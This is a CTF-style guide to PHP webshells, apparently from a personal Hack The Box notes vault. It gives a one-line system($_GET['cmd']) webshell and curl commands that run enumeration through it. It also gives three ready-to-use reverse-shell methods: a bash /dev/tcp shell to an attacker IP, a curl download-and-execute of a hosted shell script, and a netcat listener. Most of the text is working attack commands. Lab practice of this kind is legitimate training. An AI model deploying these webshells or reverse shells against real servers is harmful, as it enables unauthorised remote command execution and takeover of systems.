---
tags: [web]
---

> A **PHP webshell** is a script that executes system commands via HTTP parameters. It's the simplest and most common post-exploitation technique when you have file upload capabilities on a PHP server. This guide covers what we've practiced.

---

## Quickstart — One-Liner Webshell

```bash
# Create the webshell
$ echo '<?php system($_GET["cmd"]); ?>' > file.php

# Upload it (FTP, S3, file upload form, etc.)
# Then execute commands:
$ curl 'http://target.htb/file.php?cmd=whoami'
www-data

$ curl 'http://target.htb/file.php?cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## PHP Execution Functions

| Function | Behavior | Best for |
| :------- | :------- | :------- |
| `system()` | Executes command, prints output directly | **Default choice** — simplest |
| `exec()` | Executes command, returns last line as string | When you need to capture output in a variable |
| `shell_exec()` | Executes command, returns full output as string | When piping output to another command |
| `passthru()` | Executes command, prints raw binary output | Binary data, large dumps |

```php
// All functionally equivalent for CTF use:
<?php system($_GET["cmd"]); ?>
<?php echo shell_exec($_GET["cmd"]); ?>
<?php passthru($_GET["cmd"]); ?>
```

---

## URL Encoding — Making Commands Work

Spaces and special characters in URLs must be encoded. Common encodings:

| Character | URL-encoded | Example |
| :-------- | :---------- | :------ |
| Space | `%20` | `ls%20-la` |
| `/` | `%2F` | rarely needed |
| `|` (pipe) | `%7C` | `curl%20url%7Cbash` |
| `&` | `%26` | `ls%20%26%26%20whoami` |
| `;` | `%3B` | `cmd1%3Bcmd2` |

```bash
# Raw command
$ curl 'http://target.htb/file.php?cmd=ls -la ..'

# Same command, URL-encoded
$ curl 'http://target.htb/file.php?cmd=ls%20-la%20..'
```

> 💡 curl handles spaces in URLs, but pipes (`|`) and ampersands (`&`) **must** be encoded or escaped in bash. Use `%7C` for pipes or wrap the URL in single quotes and escape with `\`.

---

## Common Enumeration Commands

```bash
# Who are we?
cmd=whoami

# What's in the web root?
cmd=ls%20-la

# What's one level up? (flags are often in /var/www/)
cmd=ls%20-la%20..

# Find flag files
cmd=find%20/%20-name%20flag*%202>/dev/null

# Read the flag
cmd=cat%20../flag.txt
```

---

## Reverse Shell Upgrade

Once you confirm command execution, upgrade to a reverse shell:

### Method 1 — Download + Execute (no pipes)

```bash
# Attacker: host the reverse shell
$ echo '#!/bin/bash' > shell.sh
$ echo 'bash -i >& /dev/tcp/10.10.14.128/1337 0>&1' >> shell.sh
$ python3 -m http.server 8000

# Attacker: start listener
$ nc -nvlp 1337

# Target: download the script
$ curl 'http://target.htb/file.php?cmd=curl%20http://10.10.14.128:8000/shell.sh%20-o%20/tmp/s.sh'

# Target: execute it
$ curl 'http://target.htb/file.php?cmd=bash%20/tmp/s.sh'
```

### Method 2 — Pipe (one request, if the pipe works)

```bash
# Using semicolons instead of pipes (more reliable with system())
cmd=curl%20http://10.10.14.128:8000/shell.sh%20-o%20/tmp/s.sh;bash%20/tmp/s.sh
```

### Method 3 — Inline reverse shell (no HTTP server needed)

```bash
cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.14.128/1337%200>%261'
```

---

## Troubleshooting

| Symptom | Fix |
| :------ | :--- |
| Pipe (`|`) doesn't work | Use semicolons (`;`) or download + execute in two steps |
| `system()` blocked | Try `shell_exec()`, `exec()`, or `passthru()` |
| Commands not executing | Check PHP is parsing the file (`.php` extension, correct directory) |
| No output | Some functions buffer output — try `system()` or add `2>&1` |

---

## 🔗 Related

**Machines:** [[🥉 Three]]

**Guides:** [[☁️ AWS S3]], [[🎯 ffuf]], [[💣 Gobuster]]

---

## References

- [PHP system() documentation](https://www.php.net/manual/en/function.system.php)
- [PayloadsAllTheThings — PHP Webshell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php)
- [Reverse Shell Cheatsheet — Bash](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)
